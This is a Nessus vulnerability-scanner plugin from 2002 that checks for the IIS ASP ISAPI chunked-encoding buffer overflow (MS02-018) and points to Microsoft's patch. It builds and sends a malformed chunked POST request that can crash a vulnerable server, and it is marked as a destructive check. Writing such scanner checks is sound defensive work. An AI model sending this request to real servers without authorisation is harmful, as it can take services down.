#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to: Marc Maiffret - his post on vuln-dev saved a lot of my time
#
# See the Nessus Scripts License for details
#
if(description)
{
 script_id(10935);
 script_bugtraq_id(4478, 4485, 4490);
 script_cve_id("CVE-2002-0079", "CVE-2002-0147", "CVE-2002-0149");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-A-0002");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-t-0013");
 
 script_version ("$Revision: 1.21 $");
 
 name["english"] = "IIS ASP ISAPI filter Overflow";

 script_name(english:name["english"]);

 desc["english"] = "
There's a buffer overflow in the remote web server through
the ASP ISAPI filter.
 
It is possible to overflow the remote web server and execute 
commands as user SYSTEM.

Solution: See http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx
Risk factor : High";

 script_description(english:desc["english"]);

 # Summary
 summary["english"] = "Tests for a remote buffer overflow in IIS";
 script_summary(english:summary["english"]);

 # Category
 script_category(ACT_DESTRUCTIVE_ATTACK);

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "webmirror.nasl", "www_fingerprinting_hmap.nasl");

 # Family
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"],
               francais:family["francais"]);

 # Copyright
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
                  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");

 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here

include("http_func.inc");

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

if ( http_is_dead(port:port) ) exit(0);

file = get_kb_item(string("www/", port, "/contents/extensions/asp/1"));
if(!file)file = "/iisstart.asp";
    
req = string("POST ", file, " HTTP/1.1\r\n",
    			"Accept: */*\r\n",
			"Host: ", get_host_name(), "\r\n",
			"Content-Type: application/x-www-form-urlencoded\r\n",
			"Transfer-Encoding: chunked\r\n\r\n",
			"10\r\n",
			"PADPADPADPADPADP\r\n",
			"4\r\n",
			"DATA\r\n",
			"4\r\n",
			"DEST\r\n",
			"0\r\n\r\n");
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
send(socket:soc, data:req);
r = recv_line(socket:soc, length:4095);
if(!("HTTP/1.1 100 Continue" >< r))exit(0);
cnt = 0;
while(strlen(r) > 2 && cnt < 1024){
	 r = recv_line(socket:soc, length:4096);
	 cnt ++;
	 }
  
r = http_recv(socket:soc);
if(!r) 
   {
   security_hole(port);
   close(soc);
   exit(0);
   }
else set_kb_item(name:"Q319733", value:TRUE);
